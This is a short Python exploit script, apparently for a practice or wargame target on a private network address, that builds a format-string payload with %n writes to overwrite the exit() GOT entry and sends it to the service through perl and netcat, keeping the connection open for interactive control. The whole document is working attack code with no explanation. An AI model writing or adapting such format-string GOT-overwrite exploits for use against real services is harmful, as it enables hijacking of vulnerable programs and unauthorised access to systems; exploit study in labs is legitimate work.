import struct
import os

HOST = "192.168.1.74"
PORT = "20012"

EXIT_GOT = 0X0804b56c

def p(x):
    return struct.pack("<L", x)

def create_payload():
    
    payload = "%63p %24\$n%88p %25\$n"
    payload += "%1899p%26\$n%2\$p%30\$p"
    payload += p(EXIT_GOT)
    payload += p(EXIT_GOT+1)
    payload += p(EXIT_GOT+2)
    
    return payload

def send_cmd(payload):
    
    cmd = "(perl -e 'print \""
    cmd += payload
    cmd += "\"'; cat) | nc "
    cmd += HOST
    cmd += " "
    cmd += PORT

    os.system(cmd)

payload = create_payload()
send_cmd(payload)
